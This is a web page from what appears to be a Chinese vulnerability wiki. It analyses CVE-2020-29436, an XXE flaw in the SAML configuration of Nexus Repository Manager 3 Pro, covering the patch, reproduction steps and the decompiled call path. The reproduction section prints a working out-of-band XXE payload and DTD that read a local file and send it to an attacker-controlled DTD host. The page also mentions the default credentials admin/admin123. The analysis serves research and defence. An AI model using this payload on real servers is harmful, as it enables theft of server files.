<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Nexus/Nexus%20Repository%20Manager3%20ProXXE%E5%88%86%E6%9E%90%28CVE-2020-29436%29/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Nexus Repository Manager3 ProXXE分析(CVE-2020-29436) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Nexus Repository Manager3 ProXXE\u5206\u6790(CVE-2020-29436)", url: "#_top", children: [
              {title: "\u8865\u4e01", url: "#_1" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_2" },
              {title: "\u6f0f\u6d1e\u5206\u6790", url: "#_3" },
              {title: "\u53c2\u8003", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Nexus%20Repository%20Manger%20change-password%20%E4%BD%8E%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%20CVE-2020-11444/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Nexus%20Repository%20Manger%20change-password%20%E4%BD%8E%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%20CVE-2020-11444/" class="btn btn-xs btn-link">
        Nexus Repository Manger change-password 低权限修改管理员密码漏洞 CVE-2020-11444
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../NextGen/NextGenMirthConnectXStream%E5%AD%98%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../NextGen/NextGenMirthConnectXStream%E5%AD%98%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        NextGen Mirth Connect XStream存在反序列化远程代码执行漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="nexus-repository-manager3-proxxecve-2020-29436">Nexus Repository Manager3 ProXXE分析(CVE-2020-29436)<a class="headerlink" href="#nexus-repository-manager3-proxxecve-2020-29436" title="Permanent link">&para;</a></h1>
<p><strong>作者：r00t4dm@Cloud-Penetrating Arrow Lab &amp; Longofo@知道创宇404实验室</strong><br />
<strong>时间：2020年12月16日</strong></p>
<p>最近Nexus Repository Manager3<a href="https://support.sonatype.com/hc/en-us/sections/203012668-Security-Advisories">安全公告</a>更新了一个XXE漏洞，虽然需要管理权限才能利用，并且Nexus Repository Manager3在较高的版本中也会强制更改以前较低版本使用的默认密码<code>admin/admin123</code>，最后漏洞触发也很简单，但是过程还是挺有意思，并且不会受到jdk高版本导致不能带换行的问题，列目录、读文件可以带出任意字符，除了二进制文件外，没有找到能编码的协议。</p>
<h2 id="_1">补丁<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p><a href="https://github.com/sonatype/nexus-public/compare/release-3.28.1-01...release-3.29.0-02">diff</a>下最高漏洞版本3.28.1-01和修复版本3.29.0-02：</p>
<p><img alt="" src="../resource/Nexus%20Repository%20Manager3%20ProXXE%E5%88%86%E6%9E%90%28CVE-2020-29436%29/media/v2-e2be1ea0ca7a5049167e98454f591e8d_b.jpg" /></p>
<p>可以看到在一个SafeXml#configureValidator中做了限制加载外部dtd的操作，可以注意到这个configureValidator是新增的方法而不是在原方法中修复，但是只是个工具类。</p>
<h2 id="_2">漏洞复现<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>来到后台Saml的功能点：</p>
<p><img alt="" src="../resource/Nexus%20Repository%20Manager3%20ProXXE%E5%88%86%E6%9E%90%28CVE-2020-29436%29/media/v2-f331f8dd3e51ad798740576e028eea85_b.jpg" /></p>
<p>看到这个大大的XML输入框就知道大概率是有XML操作的。</p>
<p>简单测试下能不能进行dtd请求，如果能的话很可能读取文件也可以：</p>
<p><img alt="" src="../resource/Nexus%20Repository%20Manager3%20ProXXE%E5%88%86%E6%9E%90%28CVE-2020-29436%29/media/v2-0e7cdf9f0de38cf1d590babc28dff691_b.jpg" /></p>
<p>点击保存就能看到进行了请求。测试了下读文件，可以利用ftp、http等协议带出单行文件，看了下jdk版本在windows是使用的自带的8u252，@r00t4dm在mac上的安装包不会自带jdk，使用的是系统的，那么linux下也是系统的，所以试用的是较低版本的jdk，是可以带换行的。后面看了下返回包，居然把异常返回到了json，那么我们可以通过报错xml将任何文本字符带出了，包括<code>\n</code>、<code>#</code>、<code>&lt;</code>等文本字符。</p>
<p>payload:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><span class="w"> </span><span class="cp">&lt;!DOCTYPE ANY \[ &lt;!ENTITY % file SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;</span><span class="w"> </span><span class="cp">&lt;!ENTITY % dtd SYSTEM &quot;[http://127.0.0.1:8000/my.dtd](https://link.zhihu.com/?target=http%3A//127.0.0.1%3A8000/my.dtd)&quot;&gt;</span><span class="w"> </span>%dtd;<span class="w"> </span>%send;<span class="w"> </span>\]&gt;<span class="w"> </span><span class="nt">&lt;ANY&gt;</span>xxe<span class="nt">&lt;/ANY&gt;</span><span class="w"> </span>dtd：<span class="w"> </span><span class="cp">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;%file;&#39;&gt;</span>&quot;<span class="w"> </span>&gt;<span class="w"> </span>%all;
</code></pre></div>
<p>看下效果：</p>
<p><img alt="" src="../resource/Nexus%20Repository%20Manager3%20ProXXE%E5%88%86%E6%9E%90%28CVE-2020-29436%29/media/v2-98103421b633770daaf419bf9c9cbcfa_b.jpg" /></p>
<p>其他带<code>#</code>、<code>&lt;</code>等字符的文件也都可以。</p>
<h2 id="_3">漏洞分析<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>既然configureValidator是新增的方法，而且是一个static方法，那么在最新版本中大概率就有其他类调用这个方法了来修复了。在github开源的3.29.0-02代码中搜索configureValidator，没有搜到任何结果，这个地方就很奇怪了，难道是动态隐式调用？但是前面configureValidator是一个新增的方法并且是一个静态方法，感觉不太可能动态隐式调用。因为之前也弄过Nexus的漏洞，他的安装包lib中有许多代码没有在github那个开源的仓库中，所以就反编译了3.29.0-02版本所有的lib包，一搜索configureValidator，果然有调用而且就此一处：</p>
<p><img alt="" src="../resource/Nexus%20Repository%20Manager3%20ProXXE%E5%88%86%E6%9E%90%28CVE-2020-29436%29/media/v2-1d34419cfa044f377622bd716ad9c135_b.png" /></p>
<p>接着又往上搜SamlMetadataTool的调用，都是带有Saml字眼的相关类在调用。所以猜想会有个Saml的功能，去<a href="https://help.sonatype.com/repomanager3/system-configuration/user-authentication/saml">官方文档</a>搜索下：</p>
<p><img alt="" src="../resource/Nexus%20Repository%20Manager3%20ProXXE%E5%88%86%E6%9E%90%28CVE-2020-29436%29/media/v2-a1302cc05678b0f4872281a7aa1220a6_b.jpg" /></p>
<p>看到这个描述是不是有点激动呢？猜测就是这个位置了。按照描述去后台配置点，发现并不能使用这个SAML功能，再看文档说的式要Pro版本才能用这个功能，可以去官网<a href="https://www.sonatype.com/nexus/repository-pro">申请试用</a>。</p>
<p>从上面的发包可以看到处理url为<code>/service/rest/internal/ui/saml</code>，在github开源部分的代码中依然是搜不到的，在反编译的代码中搜索<code>/ui/saml</code>可以找到处理类:</p>
<p><img alt="" src="../resource/Nexus%20Repository%20Manager3%20ProXXE%E5%88%86%E6%9E%90%28CVE-2020-29436%29/media/v2-de73d543d073c1c79ca51deffa4c682b_b.png" /></p>
<p>下面是调用栈：</p>
<p><img alt="" src="../resource/Nexus%20Repository%20Manager3%20ProXXE%E5%88%86%E6%9E%90%28CVE-2020-29436%29/media/v2-02d0193c7e806f8800e61069781da8f5_b.jpg" /></p>
<p>前面调用栈太长就不copy出来了。</p>
<h2 id="_4">参考<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/337649864">https://zhuanlan.zhihu.com/p/337649864</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Nexus%20Repository%20Manger%20change-password%20%E4%BD%8E%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%20CVE-2020-11444/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Nexus%20Repository%20Manger%20change-password%20%E4%BD%8E%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%20CVE-2020-11444/" class="btn btn-xs btn-link">
        Nexus Repository Manger change-password 低权限修改管理员密码漏洞 CVE-2020-11444
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../NextGen/NextGenMirthConnectXStream%E5%AD%98%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../NextGen/NextGenMirthConnectXStream%E5%AD%98%E5%9C%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        NextGen Mirth Connect XStream存在反序列化远程代码执行漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>